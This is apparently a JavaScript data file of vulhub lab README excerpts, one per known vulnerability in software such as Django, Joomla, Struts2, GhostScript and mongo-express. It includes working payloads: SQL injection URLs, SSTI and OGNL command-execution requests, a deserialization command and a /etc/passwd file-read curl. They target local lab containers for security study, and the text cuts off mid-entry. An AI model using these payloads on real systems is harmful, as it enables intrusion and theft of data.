const kaynaklar = [{"id": "vulhub-django-cve-2021-35042", "kaynak": "vulhub", "cve": "CVE-2021-35042", "urun": "django", "baslik": "Django QuerySet.order_by() SQL Injection (CVE-2021-35042)  [中文版本(Chinese version)](README.zh-cn.md)  Django is a high-le", "yol": "django/CVE-2021-35042/README.md", "metin": "# Django QuerySet.order_by() SQL Injection (CVE-2021-35042)  [中文版本(Chinese version)](README.zh-cn.md)  Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.  Django released a security update on July 1, 2021, which fixes a SQL injection vulnerability in the `QuerySet.order_by()` function. This vulnerability affects Django versions before 3.2.5, 3.1.13.  The vulnerability can be exploited when a user has control over the input passed to the order_by() function, allowing for SQL injection at the expected column position.  References:  - <https://www.djangoproject.com/weblog/2021/jul/01/security-releases/>  ## Environment Setup  Execute the following command to compile and start a vulnerable Django 3.2.4 server:  ``` docker compose build docker compose up -d ```  After the server is started, you can access the Django home page at `http://your-ip:8000`.  ## Vulnerability Reproduction  First, visit `http://your-ip:8000/vuln/` and add the parameter `order=-id` to see the data sorted by ID in descending order:  ![](1.png)  To exploit the SQL injection vulnerability, modify the `order` parameter with the following payload, where `vuln_collection` is the model name:  ``` http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23 ```  The SQL error message will be displayed, revealing database information through the error-based SQL injection:  ![](2.png) "}, {"id": "vulhub-ghostscript-cve-2018-16509", "kaynak": "vulhub", "cve": "CVE-2018-16509", "urun": "ghostscript", "baslik": "GhostScript Sandbox Bypass Command Execution (CVE-2018-16509)  [中文版本(Chinese version)](README.zh-cn.md)  GhostScript is ", "yol": "ghostscript/CVE-2018-16509/README.md", "metin": "# GhostScript Sandbox Bypass Command Execution (CVE-2018-16509)  [中文版本(Chinese version)](README.zh-cn.md)  GhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries such as ImageMagick and Python PIL.  On August 21st, 2018, security researcher Tavis Ormandy disclosed that GhostScript's security sandbox could be bypassed through maliciously crafted image content, leading to command execution, file reading, and file deletion vulnerabilities.  References:  - <http://seclists.org/oss-sec/2018/q3/142> - <https://bugs.chromium.org/p/project-zero/issues/detail?id=1640>  ## Environment Setup  Execute the following command to start a vulnerable environment (including GhostScript 9.23 and ImageMagick 7.0.8):  ``` docker compose up -d ```  After the server is started, visit `http://your-ip:8080` to see an upload component.  ## Vulnerability Reproduction  Upload [poc.png](poc.png) to execute the command `id > /tmp/success && cat /tmp/success`. Enter the container using `docker compose exec web bash`, and you will see that /tmp/success has been created.  ![](1.png)  You can also test this vulnerability using the command line:  ``` docker run -it --rm --name im -v `pwd`/poc.png:/poc.png vulhub/imagemagick:7.0.8-10 convert /poc.png /poc.gif ```  The command execution result shows that the `id` command has been successfully executed.  ![](2.png) "}, {"id": "vulhub-joomla-cve-2023-23752", "kaynak": "vulhub", "cve": "CVE-2023-23752", "urun": "joomla", "baslik": "Joomla improper access check in webservice endpoints (CVE-2023-23752)  [中文版本(Chinese version)](README.zh-cn.md)  Joomla ", "yol": "joomla/CVE-2023-23752/README.md", "metin": "# Joomla improper access check in webservice endpoints (CVE-2023-23752)  [中文版本(Chinese version)](README.zh-cn.md)  Joomla is a free and open-source content management system (CMS) that allows users to build websites and online applications. It was first released in 2005 and has since become one of the most popular CMS platforms, powering millions of websites around the world.  An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.  References:  - <https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html> - <https://xz.aliyun.com/t/12175> - <https://vulncheck.com/blog/joomla-for-rce>  ## Vulnerable Environment  Execute following command to start a Joomla site 4.2.7:  ``` docker compose up -d ```  You can access the Joomla website through `http://your-ip:8080` after the server is started.  ## Exploit  This issue is caused by an attribute overwrite issue, the attacker can use `public=true` to bypass the authorization check.  For example, expose all configuration including MySQL username and password through this link:  ``` http://your-ip:8080/api/index.php/v1/config/application?public=true ```  ![](1.png)  Otherwise access is unauthorized without `public=true`：  ![](2.png)  Expose all users information including emails through this link:  ``` http://your-ip:8080/api/index.php/v1/users?public=true ```  ![](3.png) "}, {"id": "vulhub-hadoop-unauthorized-yarn", "kaynak": "vulhub", "cve": "unauthorized-yarn", "urun": "hadoop", "baslik": "Hadoop YARN ResourceManager Unauthorized Access  [中文版本(Chinese version)](README.zh-cn.md)  Hadoop YARN (Yet Another Reso", "yol": "hadoop/unauthorized-yarn/README.md", "metin": "# Hadoop YARN ResourceManager Unauthorized Access  [中文版本(Chinese version)](README.zh-cn.md)  Hadoop YARN (Yet Another Resource Negotiator) is Apache Hadoop's cluster resource management system. If the YARN ResourceManager is exposed to the public internet without proper access controls, an attacker can submit and execute arbitrary applications on the cluster.  References:  - <http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf> - <https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html>  ## Environment Setup  Execute the following command to start vulnerable Hadoop YARN environment:  ``` docker compose up -d ```  After the environment starts, visit `http://your-ip:8088` to access the Hadoop YARN ResourceManager WebUI.  ## Vulnerability Reproduction  The exploitation method differs slightly from the original presentation. Even without a Hadoop client, you can submit tasks directly through the REST API (https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html).  The exploitation process is as follows:  1. Set up a listener on your local machine to receive the reverse shell connection 2. Call the New Application API to create an Application 3. Call the Submit Application API to submit the malicious application  For detailed implementation, refer to the [exploit script](exploit.py). "}, {"id": "vulhub-django-cve-2018-14574", "kaynak": "vulhub", "cve": "CVE-2018-14574", "urun": "django", "baslik": "Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574)  [中文版本(Chinese version)](README.zh-cn.md)  Django is a", "yol": "django/CVE-2018-14574/README.md", "metin": "# Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574)  [中文版本(Chinese version)](README.zh-cn.md)  Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.  Django versions before 2.0.8 and 1.11.15 contain an open redirect vulnerability in CommonMiddleware when both `django.middleware.common.CommonMiddleware` and the `APPEND_SLASH` setting are enabled. If the project has a URL pattern that accepts any path ending in a slash, a maliciously crafted URL could lead to a redirect to an arbitrary external site, enabling phishing and other attacks.  References:  - <https://www.djangoproject.com/weblog/2018/aug/01/security-releases/> - <https://nvd.nist.gov/vuln/detail/CVE-2018-14574>  ## Environment Setup  Execute the following command to start a vulnerable Django 2.0.7 server:  ``` docker compose build docker compose up -d ```  After the server is started, you can access the Django home page at `http://your-ip:8000`.  ## Vulnerability Reproduction  Visit the following URL to trigger the open redirect vulnerability:  ``` http://your-ip:8000//www.example.com ```  The server will redirect you to `//www.example.com/`, which the browser interprets as an absolute URL, effectively redirecting to an external site:  ![](1.png)  This vulnerability can be exploited by attackers to redirect users to malicious websites, potentially leading to phishing attacks or other security issues. "}, {"id": "vulhub-jimureport-cve-2023-4450", "kaynak": "vulhub", "cve": "CVE-2023-4450", "urun": "jimureport", "baslik": "JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450)  [中文版本(Chinese version)](README.zh-cn", "yol": "jimureport/CVE-2023-4450/README.md", "metin": "# JeecgBoot JimuReport FreeMarker Server Side Template Injection RCE (CVE-2023-4450)  [中文版本(Chinese version)](README.zh-cn.md)  JimuReport is a open source visualization report platform under JeecgBoot project. In the JimuReport version prior to 1.6.0, there is a FreeMarker server side template injection (SSTI) issue that is able to execute arbitrary commands.  References:  - <https://github.com/advisories/GHSA-j8h5-8rrr-m6j9> - <https://whoopsunix.com/docs/java/named%20module/> - <https://www.reajason.eu.org/writing/freemarkersstimemshell/>  ## Vulnerable Environment  Execute following command to start a JimuReport 1.6.0 server:  ``` docker compose up -d ```  Wait a few seconds and you can see the index page of JimuReport on `http://your-ip:8085`.  ## Exploit  Send the following request to execute the FreeMarker template `<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}`:  ``` POST /jmreport/queryFieldBySql HTTP/1.1 Host: localhost:8085 Accept-Encoding: gzip, deflate, br Accept: */* Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36 Connection: close Cache-Control: max-age=0 Content-Type: application/json Content-Length: 100  {\"sql\":\"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ex(\\\"id\\\")}'\" } ```  The `id` command has been executed successfully:  ![](1.png) "}, {"id": "vulhub-ghostscript-cve-2019-6116", "kaynak": "vulhub", "cve": "CVE-2019-6116", "urun": "ghostscript", "baslik": "GhostScript Sandbox Bypass Command Execution (CVE-2019-6116)  [中文版本(Chinese version)](README.zh-cn.md)  GhostScript is a", "yol": "ghostscript/CVE-2019-6116/README.md", "metin": "# GhostScript Sandbox Bypass Command Execution (CVE-2019-6116)  [中文版本(Chinese version)](README.zh-cn.md)  GhostScript is a suite of software based on an interpreter for Adobe Systems' PostScript and PDF page description languages. It is widely used by many image processing libraries such as ImageMagick and Python PIL.  On January 23rd, 2019, Artifex officially merged six fixes into the master branch of GhostScript to address CVE-2019-6116. This vulnerability was reported by Google security researcher Tavis on December 3rd, 2018. The vulnerability allows attackers to bypass GhostScript's security sandbox, leading to arbitrary command execution and file reading capabilities.  References:  - <https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2> - <https://www.anquanke.com/post/id/170255>  ## Environment Setup  Execute the following command to start a vulnerable environment (including GhostScript 9.26 and ImageMagick 7.0.8-27):  ``` docker compose up -d ```  After the server is started, visit `http://your-ip:8080` to see an upload component.  ## Vulnerability Reproduction  Upload the provided [POC](poc.png) file to execute the command `id > /tmp/success`.  ![](1.png)  You can also test this vulnerability using the command line:  ``` docker run -it --rm --name uu -v `pwd`/poc.png:/tmp/poc.png vulhub/imagemagick:7.0.8-27-php identify /tmp/poc.png ```  The command will be successfully executed.  ![](2.png) "}, {"id": "vulhub-httpd-cve-2017-15715", "kaynak": "vulhub", "cve": "CVE-2017-15715", "urun": "httpd", "baslik": "Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715)  [中文版本(Chinese version)](README.zh-cn.md)  Apache HTTPD is a", "yol": "httpd/CVE-2017-15715/README.md", "metin": "# Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715)  [中文版本(Chinese version)](README.zh-cn.md)  Apache HTTPD is a widely-used HTTP server that can run PHP web pages through mod_php. A parsing vulnerability exists in versions 2.4.0 through 2.4.29, where a filename ending with `1.php\\x0A` will be treated as a PHP file, allowing attackers to bypass certain server security policies.  References:  - <https://httpd.apache.org/security/vulnerabilities_24.html> - <https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html>  ## Environment Setup  Execute the following commands to build and start a vulnerable Apache HTTPD server:  ``` docker compose build docker compose up -d ```  After the server is started, Apache will be running at `http://your-ip:8080`.  ## Vulnerability Reproduction  First, try to upload a file named `1.php`. The upload will be blocked by the security check:  ![Upload blocked by security check](1.png)  However, if we append a `\\x0A` (note: must be `\\x0A` alone, not `\\x0D\\x0A`) to the filename `1.php`, the upload will succeed:  ![Successful upload with newline character](2.png)  When accessing the uploaded file at `/1.php%0a`, it will be successfully parsed as a PHP file, despite not having a proper PHP extension. This confirms the existence of the parsing vulnerability:  ![Successful PHP execution](3.png) "}, {"id": "vulhub-cmsms-cve-2019-9053", "kaynak": "vulhub", "cve": "CVE-2019-9053", "urun": "cmsms", "baslik": "CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053)  [中文版本(Chinese version)](README.zh-cn.md)", "yol": "cmsms/CVE-2019-9053/README.md", "metin": "# CMS Made Simple (CMSMS) < 2.2.10 Unauthenticated SQL Injection (CVE-2019-9053)  [中文版本(Chinese version)](README.zh-cn.md)  CMS Made Simple (CMSMS) is a free, open source content management system to provide developers, programmers and site owners a web-based development and administration area.  In the version prior to 2.2.9.1, CMS Made Simple was affected by a unauthenticated SQL injection attack, which attacker is able to gain the administrator's password or password reset token. Combining the authenticated SSTI issue ([CVE-2021-26120](https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2021-26120)), could allow an attacker to execute arbitrary code on the target server.  References:  - <https://www.exploit-db.com/exploits/46635> - <https://srcincite.io/pocs/cve-2021-26120.py.txt>  ## Vulnerable Environment  Execute following command to start a CMS Made Simple 2.2.9.1:  ``` docker compose up -d ```  After the server is started, you should install the CMS at `http://your-ip/install.php`.  Following the install instructions to install the CMSMS, MySQL database address is `db`, database name is `cmsms`, username and password are both `root`.  ![](1.png)  ## Exploit  Use the script on <https://www.exploit-db.com/exploits/46635> to exploit the SQL injection vulnerability:  ``` python2 poc.py -u http://127.0.0.1 ```  ![](2.png)  As you can see, the administrator's password is exposed by SQL injection. "}, {"id": "vulhub-airflow-cve-2020-11978", "kaynak": "vulhub", "cve": "CVE-2020-11978", "urun": "airflow", "baslik": "Apache Airflow Command Injection in Example Dag (CVE-2020-11978)  [中文版本(Chinese version)](README.zh-cn.md)  Apache Airfl", "yol": "airflow/CVE-2020-11978/README.md", "metin": "# Apache Airflow Command Injection in Example Dag (CVE-2020-11978)  [中文版本(Chinese version)](README.zh-cn.md)  Apache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, there is a command injection vulnerability in the example DAG `example_trigger_target_dag`, which caused attackers to execute arbitrary commands in the worker process.  Since there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.  References:  - <https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx> - <https://github.com/pberba/CVE-2020-11978>  ## Vulnerability Environment  Execute the following commands to start airflow 1.10.10:  ```bash #Initialize the database docker compose run airflow-init  #Start service docker compose up -d ```  ## Exploit  Visit `http://your-ip:8080` to see the airflow management terminal, and turn on the `example_trigger_target_dag` flag:  ![](1.png)  Click the \"triger\" button on the right, then input the configuration JSON with the crafted payload `{\"message\":\"'\\\";touch /tmp/airflow_dag_success;#\"}`:  ![](2.png)  Wait a few seconds to see the execution of \"success\":  ![](3.png)  Go to the CeleryWorker container to see the result, `touch /tmp/airflow_dag_success` has been successfully executed:  ``` docker compose exec airflow-worker ls -l /tmp ```  ![](4.png) "}, {"id": "vulhub-jboss-cve-2017-7504", "kaynak": "vulhub", "cve": "CVE-2017-7504", "urun": "jboss", "baslik": "JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)  [中文版本(Chinese version)](README.zh-cn.md)  R", "yol": "jboss/CVE-2017-7504/README.md", "metin": "# JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)  [中文版本(Chinese version)](README.zh-cn.md)  Red Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 4.x and earlier versions, there is a deserialization vulnerability in the HTTPServerILServlet.java file of the JMS over HTTP Invocation Layer in JBossMQ implementation. Remote attackers can exploit this vulnerability to execute arbitrary code by using specially crafted serialized data.  References:  - https://github.com/joaomatosf/JavaDeserH2HC - https://www.youtube.com/watch?v=jVMr4eeJ2Po  ## Environment Setup  Execute the following command to start JBoss AS 4.0.5:  ``` docker compose up -d ```  After the environment is started, the target will be available at `http://your-ip:8080`.  ## Vulnerability Reproduce  This vulnerability exists in the `/jbossmq-httpil/HTTPServerILServlet` request. We can use the CommonsCollections5 exploitation chain from ysoserial to reproduce it. Generate the payload:  ``` java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"touch /tmp/success\" > 1.ser ```  Send the content of 1.ser file as POST Body:  ``` curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser ```  ![](1.png)  Execute `docker compose exec jboss bash` to enter the container, and you can see that `/tmp/success` has been successfully created. "}, {"id": "vulhub-struts2-s2-012", "kaynak": "vulhub", "cve": "s2-012", "urun": "struts2", "baslik": "S2-012 Remote Code Execution Vulnerablity  [中文版本(Chinese version)](README.zh-cn.md)  Affected Version: 2.1.0 - 2.3.13  D", "yol": "struts2/s2-012/README.md", "metin": "# S2-012 Remote Code Execution Vulnerablity  [中文版本(Chinese version)](README.zh-cn.md)  Affected Version: 2.1.0 - 2.3.13  Details: http://struts.apache.org/docs/s2-012.html  ## Reference  If the redirect type is used when configuring `result` in the `action`, and ${param_name} is also used as the redirect variable, for example:  ```xml <package name=\"S2-012\" extends=\"struts-default\">     <action name=\"user\" class=\"com.demo.action.UserAction\">         <result name=\"redirect\" type=\"redirect\">/index.jsp?name=${name}</result>         <result name=\"input\">/index.jsp</result>         <result name=\"success\">/index.jsp</result>     </action> </package> ```  During the redirection process, struts2 performs an OGNL expression parsing on the value of the `name` parameter, so that OGNL expression can be inserted to cause the command execution.  ## Setup  ``` docker compose build docker compose up -d ```  ## Exploit  We can use s2-001's POC directly:  ``` %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"cat\", \"/etc/passwd\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} ```  Result：  ![](1.png) "}, {"id": "vulhub-dns-dns-zone-transfer", "kaynak": "vulhub", "cve": "dns-zone-transfer", "urun": "dns", "baslik": "DNS Zone Transfers (AXFR)  [中文版本(Chinese version)](README.zh-cn.md)  DNS zone transfers using the AXFR protocol are the ", "yol": "dns/dns-zone-transfer/README.md", "metin": "# DNS Zone Transfers (AXFR)  [中文版本(Chinese version)](README.zh-cn.md)  DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.  References:  - https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/ - https://nmap.org/nsedoc/scripts/dns-zone-transfer.html  ## Vulnerable Environment  Vulhub uses [Bind9](https://wiki.debian.org/Bind9) to build the dns server, but that does not mean that only Bind9 supports AXFR records.  To run the DNS server.  ``` docker compose up -d ```  Once the environment is running, it will listen on port 53 of TCP and UDP, and the DNS protocol supports data transfer from both ports.  ## POC  Under Linux, we can use the **dig** command to send AXFR record requests: `dig @your-ip -t axfr vulhub.org`  ![](2.png)  As you can see, I got all the subdomain records of `vulhub.org`, and there is a DNS zone transfers vulnerability here.  We can also use the Nmap script to scan for this vulnerability: `nmap --script dns-zone-transfer.nse --script-args \"dns-zone-transfer.domain=vulhub.org\" -Pn -p 53 your-ip`  ![](3.png) "}, {"id": "vulhub-solr-remote-streaming-fileread", "kaynak": "vulhub", "cve": "Remote-Streaming-Fileread", "urun": "solr", "baslik": "Apache Solr RemoteStreaming Arbitrary File Reading and SSRF  [中文版本(Chinese version)](README.zh-cn.md)  Apache Solr is an", "yol": "solr/Remote-Streaming-Fileread/README.md", "metin": "# Apache Solr RemoteStreaming Arbitrary File Reading and SSRF  [中文版本(Chinese version)](README.zh-cn.md)  Apache Solr is an open-source search server. When Apache Solr does not have authentication enabled, an attacker can craft a request to enable specific configurations, potentially leading to Server-Side Request Forgery (SSRF) or arbitrary file reading vulnerabilities.  References:  - <https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ>  ## Environment Setup  Execute the following command to start an Apache Solr 8.8.1 server:  ``` docker compose up -d ```  After the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`.  ## Vulnerability Reproduction  First, visit `http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:  ![](1.png)  Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:  ``` curl -i -s -k -X $'POST' \\      -H $'Content-Type: application/json' --data-binary $'{\\\"set-property\\\":{\\\"requestDispatcher.requestParsers.enableRemoteStreaming\\\":true}}' \\      $'http://your-ip:8983/solr/demo/config' ```  ![](2.png)  Then, you can read arbitrary files through the `stream.url` parameter:  ``` curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd' ```  ![](3.png) "}, {"id": "vulhub-httpd-ssi-rce", "kaynak": "vulhub", "cve": "ssi-rce", "urun": "httpd", "baslik": "Apache HTTP Server SSI Remote Command Execution  [中文版本(Chinese version)](README.zh-cn.md)  Apache HTTP Server with Serve", "yol": "httpd/ssi-rce/README.md", "metin": "# Apache HTTP Server SSI Remote Command Execution  [中文版本(Chinese version)](README.zh-cn.md)  Apache HTTP Server with Server Side Includes (SSI) enabled allows server-side execution of commands through special SSI directives in HTML files. When misconfigured, this feature can be exploited through file upload vulnerabilities.  When testing arbitrary file upload vulnerabilities, the target server might block files with PHP extensions. However, if the server has SSI and CGI support enabled, attackers can upload an SHTML file and execute arbitrary commands using the `<!--#exec cmd=\"command\" -->` syntax.  References:  - [Apache SSI Documentation](https://httpd.apache.org/docs/2.4/howto/ssi.html) - [W3 SSI Directives](https://www.w3.org/Jigsaw/Doc/User/SSI.html)  ## Environment Setup  Execute the following command to start an Apache HTTP Server with SSI and CGI support:  ``` docker compose up -d ```  After the server is started, visit `http://your-ip:8080/upload.php` to access the upload form.  ## Vulnerability Reproduction  While uploading PHP files is not allowed, we can upload a file named `shell.shtml` with the following content:  ```shtml <!--#exec cmd=\"ls\" --> ```  ![Upload Interface](1.png)  After successful upload, visiting the shell.shtml file will execute the command, demonstrating the vulnerability:  ![Command Execution Result](2.png) "}, {"id": "vulhub-ntopng-cve-2021-28073", "kaynak": "vulhub", "cve": "CVE-2021-28073", "urun": "ntopng", "baslik": "ntopng Authentication Bypass (CVE-2021-28073)  [中文版本(Chinese version)](README.zh-cn.md)  Ntopng is a passive network mon", "yol": "ntopng/CVE-2021-28073/README.md", "metin": "# ntopng Authentication Bypass (CVE-2021-28073)  [中文版本(Chinese version)](README.zh-cn.md)  Ntopng is a passive network monitoring tool focused on flows and statistics that can be obtained from the traffic captured by the server.  There is a authentication bypass vulnerability in ntopng 4.2 and previous versions.  Reference link:  - http://noahblog.360.cn/ntopng-multiple-vulnerabilities/  ## Vulnerability Environment  Execute the following command to start ntopng:  ``` docker compose up -d ```  After the server is started, browse the `http://your-ip:3000` to see the login page, whose default password is admin/admin, and the password will be request to reset for the first login.  ## Vulnerability Reproduce  According to the reference link and the simple [poc.py](poc.py), calculate the length of the ntopng lua directory:  ``` python poc.py --url http://your-ip:3000/ baselength ```  ![](1.png)  It can be seen that the path length in the Vulhub container is 36.  Then, browse the page or interface that we want to access without authorization, such as `/lua/find_prefs.lua`, and it will be redirected to the login page.  Use POC to generate unauthorized access URL:  ``` python poc.py --url http://your-ip:3000/ generate -l 36 -p find_prefs.lua ```  ![](2.png)  The interface is able to access without authorization through this URL:  ![](3.png) "}, {"id": "vulhub-neo4j-cve-2021-34371", "kaynak": "vulhub", "cve": "CVE-2021-34371", "urun": "neo4j", "baslik": "Neo4j Shell Server `setSessionVariable` Deserialization (CVE-2021-34371)  [中文版本(Chinese version)](README.zh-cn.md)  Neo4", "yol": "neo4j/CVE-2021-34371/README.md", "metin": "# Neo4j Shell Server `setSessionVariable` Deserialization (CVE-2021-34371)  [中文版本(Chinese version)](README.zh-cn.md)  Neo4j is a graph database management system developed by Neo4j, Inc.  Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI service that arbitrarily deserializes Java objects, e.g., through setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.  Neo4j Shell is replaced by Cyber Shell after Neo4j 3.5.  References:  - https://www.exploit-db.com/exploits/50170 - https://github.com/mozilla/rhino/issues/520  ## Vulnerable Environment  If you are using Linux or OSX, you can execute the following command to start a Neo4j 3.4.18:  ``` TARGET_IP=<your-ip> docker compose up -d ```  Environment `TARGET_IP` is a configuration to describe the Neo4j's hostname.  If you are using Windows, update the content of `docker-compose.yml` and modify the environment manually.  Once the service is started, visit `http://your-ip:7474` to see the web management page, but what we need to attack is port 1337, which is the Neo4j Shell port and uses the RMI protocol to communicate.  ## Exploit  Sending RMI request through the [Rhino Gadget](rhino_gadget/):  ![](1.png)  `touch /tmp/success5` has been successfully executed:  ![](2.png) "}, {"id": "vulhub-mongo-express-cve-2019-10758", "kaynak": "vulhub", "cve": "CVE-2019-10758", "urun": "mongo-express", "baslik": "Mongo Express Remote Code Execution (CVE-2019-10758)  [中文版本(Chinese version)](README.zh-cn.md)  mongo-express is a third", "yol": "mongo-express/CVE-2019-10758/README.md", "metin": "# Mongo Express Remote Code Execution (CVE-2019-10758)  [中文版本(Chinese version)](README.zh-cn.md)  mongo-express is a third-party Web interface for MongoDB, developed using Node.js and Express. If an attacker can successfully log in, or if the target server hasn't changed the default credentials (`admin:pass`), they can execute arbitrary Node.js code.  ## Environment Setup  Execute the following command to start mongo-express version 0.53.0:  ```bash docker compose up -d ```  After the environment starts, visit `http://your-ip:8081` to access the Web interface.  ## Vulnerability Reproduction  Send the following HTTP request to execute the code `this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"touch /tmp/success\")`:  ``` POST /checkValid HTTP/1.1 Host: your-ip Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Authorization: Basic YWRtaW46cGFzcw== Content-Type: application/x-www-form-urlencoded Content-Length: 124  document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"touch /tmp/success\") ```  As you can see, the `touch /tmp/success` command has been executed successfully:  ![](1.png) "}, {"id": "vulhub-gitlab-cve-2021-22205", "kaynak": "vulhub", "cve": "CVE-2021-22205", "urun": "gitlab", "baslik": "GitLab Pre-Auth Remote Command Execution (CVE-2021-22205)  [中文版本(Chinese version)](README.zh-cn.md)  GitLab is a web-bas", "yol": "gitlab/CVE-2021-22205/README.md", "metin": "# GitLab Pre-Auth Remote Command Execution (CVE-2021-22205)  [中文版本(Chinese version)](README.zh-cn.md)  GitLab is a web-based DevOps lifecycle tool that provides a Git repository manager providing wiki, issue-tracking and continuous integration and deployment pipeline features.  An issue has been discovered in GitLab CE/EE affecting the versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in an unauthenticated remote command execution.  References:  - https://hackerone.com/reports/1154542 - https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html - https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/ - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml  ## Vulnerable environment  Execute following command to start a GitLab Community Server 13.10.1:  ``` docker compose up -d ```  After the server is started, browse the `http://your-ip:8080` to see the website.  ## Exploit  The api endpoint `/uploads/user` is an unauthenticated interface. Attack the server through the [poc.py](poc.py):  ``` python poc.py http://your-ip:8080 \"touch /tmp/success\" ```  ![](1.png)  `touch /tmp/success` has been executed successfully:  ![](2.png) "}, {"id": "vulhub-phpmyadmin-cve-2016-5734", "kaynak": "vulhub", "cve": "CVE-2016-5734", "urun": "phpmyadmin", "baslik": "PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734)  [中文版本(Chinese version)](README.zh-cn.md)  Ph", "yol": "phpmyadmin/CVE-2016-5734/README.md", "metin": "# PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734)  [中文版本(Chinese version)](README.zh-cn.md)  PhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. The vulnerability is in the `preg_replace` function, because the information submitted by the user can be spliced into the first parameter.  Before PHP 5.4.7, the first parameter of `preg_replace` could be truncated with `\\0` and the change search pattern to `\\e`. It can cause remote code execution vulnerability.  Affected versions:  - 4.0.x version before 4.0.10.16 - 4.4.x version before 4.4.15.7 - 4.6.x version before 4.6.3 (actually because this version requires PHP5.5+, this vulnerability cannot be reproduced)  ## Setup  Execute following commands to start PHP 5.3 + Apache + phpMyAdmin 4.4.15.6:  ``` docker compose up -d  ```  After start, visit `http://your-ip:8080` and you will see the login page of phpMyAdmin. Log in with `root`:`root`.  ## Exploit  This vulnerability requires login and the permission to write data.  We use this POC(https://www.exploit-db.com/exploits/40185/) to reproduce the vulnerability.  ``` ./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/ ```  Result:  ![](1.png) "}, {"id": "vulhub-thinkphp-2-rce", "kaynak": "vulhub", "cve": "2-rce", "urun": "thinkphp", "baslik": "ThinkPHP 2.x Remote Code Execution  [中文版本(Chinese version)](README.zh-cn.md)  ThinkPHP is a popular PHP framework widely", "yol": "thinkphp/2-rce/README.md", "metin": "# ThinkPHP 2.x Remote Code Execution  [中文版本(Chinese version)](README.zh-cn.md)  ThinkPHP is a popular PHP framework widely used in China. ThinkPHP versions 2.x contain a remote code execution that caused by the `preg_replace`.  In ThinkPHP 2.x, the framework uses `preg_replace` with `/e` modifier to match routes:  ```php $res = preg_replace('@(\\w+)'.$depr.'([^'.$depr.'\\/]+)@e', '$var[\\'\\\\1\\']=\"\\\\2\";', implode($depr,$paths)); ```  This implementation causes user input parameters to be executed within double quotes, leading to arbitrary code execution. The vulnerability also exists in ThinkPHP 3.0 when running in Lite mode, as this issue wasn't patched in that specific mode.  ## Environment Setup  Execute the following command to start a ThinkPHP 2.1 demo application:  ```bash docker compose up -d ```  After the server is started, you can visit `http://your-ip:8080/Index/Index` to see the default page.  ## Vulnerability 